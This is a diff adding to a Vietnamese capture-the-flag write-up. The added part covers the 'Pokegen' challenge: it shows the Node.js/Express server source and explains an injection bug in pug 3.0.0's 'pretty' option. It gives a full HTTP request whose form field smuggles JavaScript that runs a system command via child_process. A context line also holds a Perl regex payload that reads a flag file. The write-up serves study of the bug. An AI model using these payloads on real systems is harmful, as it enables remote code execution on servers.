@@ -424,3 +424,164 @@ Payload: ``` /cgi-bin/api.pl?search=(?{print+`cat+/FLAAAG_HERE_NO_ONNE_CAN_GUESS
    
 > Flag: `HCMUS-CTF{learn-me-plz-https://www.rexegg.com/regex-disambiguation.html}`   
 ## `Pokegen` 
+  
+Source code:  
+```nodejs
+// server.js
+const express = require("express");
+const session = require('express-session');
+const config = require("./config");
+const MongoClient = require('mongodb').MongoClient;
+var db;
+const app = express();
+const port = process.env.APP_PORT || 1337;
+const host = "0.0.0.0";
+
+app.use(session(config.session));
+app.set("view engine", "pug");
+app.use(express.static("public"));
+app.use(express.urlencoded({extended: true}));
+
+app.use((req, res, next) => {
+    const allowedType = ["string", "number"];
+    for (key in req.query) {
+        if (!allowedType.includes(typeof (req.query[key])))
+            return res.send("Nice try");
+    }
+    for (key in req.body) {
+        if (!allowedType.includes(typeof (req.body[key])))
+            return res.send("Nice try");
+    }
+    next();
+})
+
+app.route("/")
+    .all((req, res, next) => {
+        if (!req.session.authenticated)
+            return res.redirect("/register");
+        next();
+    })
+    .get((req, res) => {
+        req.session.user.pokemon = Math.floor(Math.random()*3);
+        req.session.user.health = Math.floor(Math.random()*4) + 1;
+        req.session.user.power = Math.floor(Math.random()*4) + 1;
+        res.render("index", req.session.user);
+    });
+
+app.route("/register")
+    .all((req, res, next) => {
+        if (req.session.authenticated)
+            return res.redirect("/");
+        next();
+    })
+    .get((req, res) => {
+        return res.render("register");
+    })
+    .post((req, res) => {
+        user = {...req.body, health: Math.floor(Math.random()*4) + 1, power: Math.floor(Math.random()*4) + 1};
+        console.log(user)
+        db.collection("users").insertOne(user);
+        req.session.authenticated = true;
+        req.session.user = {};
+        req.session.user.username = req.body.username;
+        return res.redirect("/");
+    })
+
+app.route("/login")
+    .all((req, res, next) => {
+        if (req.session.authenticated)
+            return res.redirect("/");
+        next();
+    })
+    .get((req, res) => {
+        return res.render("login");
+    })
+    .post((req, res) => {
+        db.collection("users").findOne(
+            {username: req.body.username, password: req.body.password}, 
+            (err, result) => {
+                if (err)
+                    return res.render("login", {error: "Something error"});
+                if (!result)
+                    return res.render("login", {error: "Wrong username or password"});
+                req.session.authenticated = true;
+                req.session.user = {};
+                req.session.user.username = result.username;
+                return res.render("index", result);
+        });
+    })
+
+MongoClient.connect("mongodb://localhost:27017/pokegen", (err, client) => {
+    if (err) { 
+        console.log(err);
+        return;
+    }
+    db = client.db("pokegen");
+    app.listen(port, host);
+    console.log(`Running on http://${host}:${port}`);
+    });
+```
+```js
+// package.js  
+
+{
+  "name": "pokegen",
+  "version": "1.0.0",
+  "description": "",
+  "main": "server.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "express": "^4.17.1",
+    "express-session": "^1.17.1",
+    "mongodb": "^3.6.6",
+    "pug": "3.0.0"
+  }
+}
+```  
+Với những dạng như này, mình hay xem `package.json` trước tiên, vì rất có thể tác giả sử dụng version của những `lib` hay `module` cũ và tất nhiên nếu may mắn, ta có thể tìm được chi tiết về cách khai thác của bug đó. Trong case này, version của `pug` ở đây là `pug==3.0.0`, ta có thể dễ tìm thấy được issue của nó tại đây: [https://github.com/pugjs/pug/issues/3312](https://github.com/pugjs/pug/issues/3312)  
+  
+Bug này nhắm vào `pretty options` của `pug compiler`, nghĩa là nếu ta control được biến `pretty` hay `options.pretty` thì có thể `RCE` được, bằng cách khai thác chổ  
+```nodejs
+...
+app.route("/register")
+    ...
+    })
+    .post((req, res) => {
+        user = {...req.body, health: Math.floor(Math.random()*4) + 1, power: Math.floor(Math.random()*4) + 1};
+        console.log(user)
+        db.collection("users").insertOne(user);
+        req.session.authenticated = true;
+        req.session.user = {};
+        req.session.user.username = req.body.username;
+        return res.redirect("/");
+    })
+    ...
+```  
+`req.body` là input của mình, nghĩa là có thể nhập bất cứ gì mà ta muốn rồi sau đó nó được đưa vào biến `user` => Nên ta có thể đưa biến `pretty` vào chổ này thông qua chức năng `/register`  
+  
+```text
+POST /register HTTP/1.1
+Host: localhost:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+Origin: http://localhost:1337
+Connection: close
+Referer: http://localhost:1337/register
+Cookie: connect.sid=s%3ABX9aeSpbk4oPCyz9a3907yNADa45EPm0.iI1heOLJUaCjIg9BQREvpcdANOMFUH%2BvwaEXhJHnWss
+Upgrade-Insecure-Requests: 1
+
+username=nhienit&password=rce&pretty=');process.mainModule.constructor._load('child_process').exec('calc');_=('
+```  
+  
+Sau khi login thành công thì có thể thấy popup của `calc.exe` của mình đã hiện lên và có thể RCE.  
+![](./rce.png)  
+  
+Tiếc là, team mình đã không kịp solve được challenge này nên khá là hối tiếc :(((
